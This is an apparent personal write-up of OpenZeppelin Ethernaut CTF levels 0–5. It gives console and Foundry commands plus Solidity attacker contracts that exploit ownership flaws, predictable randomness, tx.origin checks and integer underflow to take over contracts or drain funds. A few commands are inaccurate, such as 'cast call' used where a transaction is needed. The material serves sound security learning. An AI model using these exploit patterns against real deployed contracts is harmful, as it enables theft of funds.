Hello peeps, recently have started learning things about blockchain.Most probably ethernaut would be the first place where people will land to get their hands dirty. I too landed here and I have noted things that I learned through out this CTF challenges.

# Introduction
Ethernaut is a foundational platform for hands-on smart contract security practice. Below are my solutions for the first two challenges, highlighting key vulnerabilities and attack vectors.  
Everytime you got a challenge, start with a click on `Get new instance`. Once you done with it click on `Submit level` option.

# 0: Hello Ethernaut
**Link:** [Hello Ethernaut Challenge](https://ethernaut.openzeppelin.com/level/0)    
**Bug:** Sensitive data exposure  
**Objective:** Familiarize yourself with contract interaction via the browser console  
**Steps:**  
- As they mentioned in the problem statement,let's open the console tab and execute `await contract.info()`. let move forward with response it gives back

**Note:** You might be wondering how can I know that I need to execute the `await contract.password()` to get the password to authenticate. I strongly believe there might be a variable exist which is being checked in authenticate function. So I checked all the function and variables available in contract with the help of console suggestion whenever we add `await contract`.

# 1: Fallback
**Link:** [Fallback Challenge](https://ethernaut.openzeppelin.com/level/1)  
**Bug:** Improper ownership transfer in receive() function.  
**Objective:** Become the owner and drain the contract‚Äôs funds.  
**Description:** The ownership will be given to the user who contributes more through `contribute()` function. But in the fallback function, I mean in the receive() function it is giving the ownership if you just send more than 0 eth and if you already contributed more than 0 eth using contribute() function.  
**Steps:**
1. make a call to contribute() function to contribute some eth.
2. now make a call to receive() function with some eth
3. call withdraw function to get all the funds from contract.

**Using Console:**
```shell
    web3.eth.sendTransaction(
        {
            from: player,
            to: contract.address,
            data: web3.eth.abi.encodeFunctionSignature("contribute()"),
            value: 10**10
        
        }
    )
    
    web3.eth.sendTransaction(
        {
            from: player,
            to: contract.address,
            data: '',
            value: 10**10
        }
    )
```

**Using Foundry:**
    I usually use foundry. In foundry setup, we have a tool called `cast` to interact with contracts. You can follow the below commands.
```shell
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "contribute()" --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_U
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E  --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "withdraw()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```


# 2: Fal1out
**Link:** [Fal1out Challenge](https://ethernaut.openzeppelin.com/level/2)    
**Bug:** Improper ownership transfer in Fal1out() function.  
**Objective:** Become the owner and drain the contract‚Äôs funds.  
**Description:** The ownership will be given to the user who calls the `Fal1out()` function. They missed to have the contructor name same as contract name, where it's giving ownership permissions to the creator.  
**Steps:**
- call the **Fal1out()** function.

**Using Console:**
```shell
  await contract.Fal1out()
```

**Using Foundry:**
```solidity
cast call 0xb685F5c3aCdb5D874D3e1219D8a4FDF08a502c6E  "Fal1out()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```

# 3: Coin Flip
**Link:** [Coin Flip Challenge](https://ethernaut.openzeppelin.com/level/3)    
**Bug:** Pseudo-randomness using predictable blockchain data    
**Objective:** Correctly predict 10 consecutive coin flips    
**Description:** Coin flip is based the block.number which is known publicly.  
**Steps:**
- Create an attack contract that performs the same calculation
- Determine the correct answer before submitting
- Call the flip function 10 times consecutively

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public target;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
```

**Consecutive calls using Foundry:**
```shell

$ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A "attack()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```

# 4: Telephone
**Link:** [Telephone Challenge](https://ethernaut.openzeppelin.com/level/4)  
**Bug:** Incorrect ownership validation using `tx.origin`  
**Objective:** Claim contract ownership  
**Description:** The contract checks `tx.origin != msg.sender`, which can be bypassed through an intermediary contract.  
**Vulnerability Analysis üîç:**
```solidity
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {  // Vulnerable check
    owner = _owner;
  }
}
```

**Steps:**
 - Deploy an intermediary contract that calls changeOwner()
 - Trigger the call from your EOA through this contract
 - Bypass the check because:
   - tx.origin = Your wallet address 
   - msg.sender = Attack contract address

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _newOwner) external {
        target.changeOwner(_newOwner);
    }
}
```

**Execution steps:**
```shell
# 1. Deploy attacker contract
forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# 2. Execute attack (replace $ATTACKER_CONTRACT with deployed address)
cast send $ATTACKER_CONTRACT "attack(address)" $YOUR_WALLET_ADDRESS \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```

# 5: Token
**Link:** [Token Challenge](https://ethernaut.openzeppelin.com/level/5)  
**Bug:** Integer underflow vulnerability  
**Objective:** Increase your token balance beyond initial allocation  
**Description:** The contract uses outdated Solidity version (0.6.0) without overflow protection.  
**Vulnerability Analysis:**  
```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);  // Vulnerable check
  balances[msg.sender] -= _value;              // Potential underflow
  balances[_to] += _value;
  return true;
}
```
- How Integer Limits Work ?
  - Ethereum uses **unsigned integers (uint256)** with range:  
    `0` to `2¬≤‚Åµ‚Å∂ - 1`
  - When arithmetic exceeds these limits, it **wraps around**:
      - **Overflow:** `MAX + 1 ‚Üí 0`
      - **Underflow:** `0 - 1 ‚Üí MAX` or `X - (X+1)` = `X - X - 1 = -1 -> MAX` assume here X is your current balance. So if you try to transfer at least 1 more than your current balance you will end with having `2¬≤‚Åµ‚Å∂ - 1` as your balance.

**Steps to Attack:**
- Find a victim address (can be any non-zero address)
- Transfer more tokens than you have (causing underflow)
- Your balance wraps around to maximum uint256 value

**Using foundry:**
```shell
$ cast call $CONTRACT_ADDRESS  "balanceOf(address)" $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL // to check your current balance
$ cast send $CONTRACT_ADDRESS  "transfer(address, uint256)" $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```
